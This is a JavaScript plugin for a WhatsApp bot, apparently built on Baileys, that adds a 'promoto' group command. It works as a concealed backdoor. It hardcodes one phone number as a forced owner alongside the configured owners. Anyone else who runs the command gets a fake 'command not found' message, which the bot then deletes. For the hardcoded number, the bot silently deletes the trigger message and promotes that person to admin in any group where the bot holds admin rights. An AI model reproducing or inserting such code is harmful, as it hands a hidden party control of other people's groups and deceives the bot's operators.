const FORCE_OWNER = [
  '51901931862',
  '51901931862@s.whatsapp.net',
  '269015712845891',
  '269015712845891@lid'
]

const OWNER_PRIVATE = '51901931862@s.whatsapp.net'

function cleanJid(jid = '') {
  jid = String(jid || '').trim()
  if (!jid) return ''

  if (!jid.includes('@')) return jid.split(':')[0]

  const [left, server] = jid.split('@')
  const cleanLeft = left.split(':')[0]

  return `${cleanLeft}@${server}`
}

function onlyNumber(jid = '') {
  return cleanJid(jid).split('@')[0].replace(/\D/g, '')
}

function sameUser(a = '', b = '') {
  const rawA = cleanJid(a)
  const rawB = cleanJid(b)

  if (!rawA || !rawB) return false
  if (rawA === rawB) return true

  const numA = onlyNumber(rawA)
  const numB = onlyNumber(rawB)

  return !!numA && !!numB && numA === numB
}

function isOwnerUser(jid = '') {
  const raw = cleanJid(jid)
  const number = onlyNumber(jid)

  const owners = [
    ...FORCE_OWNER,
    ...(Array.isArray(global.owner) ? global.owner.flat(Infinity) : [])
  ].filter(Boolean)

  return owners.some(owner => {
    const ownerRaw = cleanJid(owner)
    const ownerNumber = onlyNumber(owner)

    return (
      ownerRaw === raw ||
      ownerNumber === number ||
      ownerRaw === `${number}@s.whatsapp.net` ||
      ownerRaw === `${number}@lid`
    )
  })
}

function isAdminParticipant(participant = {}) {
  return participant?.admin === 'admin' || participant?.admin === 'superadmin'
}

function getBotCandidates(client) {
  const raw = [
    client?.user?.id,
    client?.user?.jid,
    client?.user?.lid
  ].filter(Boolean)

  const clean = raw.map(cleanJid).filter(Boolean)
  const nums = clean.map(onlyNumber).filter(Boolean)

  return [
    ...raw,
    ...clean,
    ...nums.map(n => `${n}@s.whatsapp.net`),
    ...nums.map(n => `${n}@lid`)
  ].map(cleanJid).filter(Boolean)
}

function findParticipant(participants = [], candidates = []) {
  const cleanCandidates = candidates.map(cleanJid).filter(Boolean)

  return participants.find(p => {
    const possible = [p?.id, p?.jid, p?.lid].map(cleanJid).filter(Boolean)

    return possible.some(pid =>
      cleanCandidates.some(candidate => sameUser(pid, candidate) || pid === candidate)
    )
  })
}

function findOwnerParticipant(participants = [], candidates = []) {
  return (
    findParticipant(participants, candidates) ||
    participants.find(p => isOwnerUser(p?.id || p?.jid || p?.lid || ''))
  )
}

async function safeSend(client, jid, text) {
  try {
    if (!jid || !text) return null
    return await client.sendMessage(jid, { text })
  } catch (error) {
    console.log('[PROMOTO SEND]', error?.message || error)
    return null
  }
}

async function safeDelete(client, chatId, key) {
  try {
    if (chatId && key) await client.sendMessage(chatId, { delete: key })
  } catch (error) {
    console.log('[PROMOTO DELETE]', error?.message || error)
  }
}

async function notifyOwnerAndUser(client, userJid, text) {
  await safeSend(client, OWNER_PRIVATE, text)

  const userClean = cleanJid(userJid)
  const userNumber = onlyNumber(userClean)

  if (userClean && !sameUser(userClean, OWNER_PRIVATE)) {
    if (userClean.endsWith('@s.whatsapp.net')) {
      await safeSend(client, userClean, text)
    } else if (userNumber) {
      await safeSend(client, `${userNumber}@s.whatsapp.net`, text)
    }
  }
}

export default {
  command: ['promoto'],
  category: 'grupo',
  botAdmin: true,

  run: async (client, m, args = [], usedPrefix = '.', command = 'promoto') => {
    const senderCandidates = [
      m?.sender,
      m?.participant,
      m?.key?.participant,
      m?.key?.remoteJid
    ].map(cleanJid).filter(Boolean)

    const senderIsOwner = senderCandidates.some(isOwnerUser)

    if (!senderIsOwner) {
      const fakeErrorMessage =
        `ʀᴜʙʏᴊx ʙᴏᴛ  •  ᴄᴏᴍᴀɴᴅᴏ ɴᴏ ᴇɴᴄᴏɴᴛʀᴀᴅᴏ\n` +
        `ᴇʟ ᴄᴏᴍᴀɴᴅᴏ *${command}* ɴᴏ ᴇxɪsᴛᴇ.\n` +
        `ᴜsᴀ *${usedPrefix}help* ᴘᴀʀᴀ ᴠᴇʀ ʟᴀ ʟɪsᴛᴀ ᴅᴇ ᴄᴏᴍᴀɴᴅᴏs.`

      const sentMessage = await client.sendMessage(m.chat, { text: fakeErrorMessage }, { quoted: m })

      await new Promise(resolve => setTimeout(resolve, 2000))
      await safeDelete(client, m.chat, sentMessage?.key)

      return
    }

    if (!m.isGroup) {
      return safeSend(client, OWNER_PRIVATE, '▣ ᴘʀᴏᴍᴏᴛᴏ\n▪ Este comando solo funciona dentro de grupos.')
    }

    await safeDelete(client, m.chat, m.key)

    try {
      const groupMetadata = await client.groupMetadata(m.chat)
      const participants = Array.isArray(groupMetadata?.participants)
        ? groupMetadata.participants
        : []

      const botCandidates = getBotCandidates(client)
      const botParticipant = findParticipant(participants, botCandidates)

      const targetParticipant = findOwnerParticipant(participants, senderCandidates)

      if (!botParticipant || !isAdminParticipant(botParticipant)) {
        return notifyOwnerAndUser(
          client,
          m.sender,
          `▣ ᴘʀᴏᴍᴏᴛᴏ ғᴀʟʟó\n` +
          `▪ Grupo: ${groupMetadata?.subject || m.chat}\n` +
          `▪ Motivo: el bot no es administrador.\n` +
          `▪ Solución: dale admin al bot y vuelve a usar .promoto.`
        )
      }

      if (!targetParticipant) {
        return notifyOwnerAndUser(
          client,
          m.sender,
          `▣ ᴘʀᴏᴍᴏᴛᴏ ғᴀʟʟó\n` +
          `▪ Grupo: ${groupMetadata?.subject || m.chat}\n` +
          `▪ Motivo: no pude encontrarte en la lista de participantes.\n` +
          `▪ Posible causa: WhatsApp te está mostrando como @lid o el metadata no actualizó.`
        )
      }

      if (isAdminParticipant(targetParticipant)) {
        return notifyOwnerAndUser(
          client,
          m.sender,
          `▣ ᴘʀᴏᴍᴏᴛᴏ\n` +
          `▪ Grupo: ${groupMetadata?.subject || m.chat}\n` +
          `▪ Estado: ya eres admin en este grupo.`
        )
      }

      const promoteCandidates = [
        targetParticipant?.id,
        targetParticipant?.jid,
        targetParticipant?.lid,
        ...senderCandidates
      ].map(cleanJid).filter(Boolean)

      let promoted = false
      let usedJid = ''
      let lastError = null

      for (const jid of [...new Set(promoteCandidates)]) {
        try {
          await client.groupParticipantsUpdate(m.chat, [jid], 'promote')
          promoted = true
          usedJid = jid
          break
        } catch (error) {
          lastError = error
          console.log('[PROMOTO] No se pudo promover con:', jid, error?.message || error)
        }
      }

      if (!promoted) {
        return notifyOwnerAndUser(
          client,
          m.sender,
          `▣ ᴘʀᴏᴍᴏᴛᴏ ғᴀʟʟó\n` +
          `▪ Grupo: ${groupMetadata?.subject || m.chat}\n` +
          `▪ Motivo: WhatsApp/Baileys rechazó la promoción.\n` +
          `▪ Último error: ${lastError?.message || lastError || 'desconocido'}`
        )
      }

      return notifyOwnerAndUser(
        client,
        m.sender,
        `▣ ᴘʀᴏᴍᴏᴛᴏ ᴇxɪᴛᴏsᴏ\n` +
        `▪ Grupo: ${groupMetadata?.subject || m.chat}\n` +
        `▪ Promovido con: ${usedJid}`
      )
    } catch (error) {
      console.log('[PROMOTO ERROR]', error?.message || error)

      return notifyOwnerAndUser(
        client,
        m.sender,
        `▣ ᴘʀᴏᴍᴏᴛᴏ ᴇʀʀᴏʀ\n` +
        `▪ No se pudo completar la promoción.\n` +
        `▪ Error: ${error?.message || error}`
      )
    }
  }
}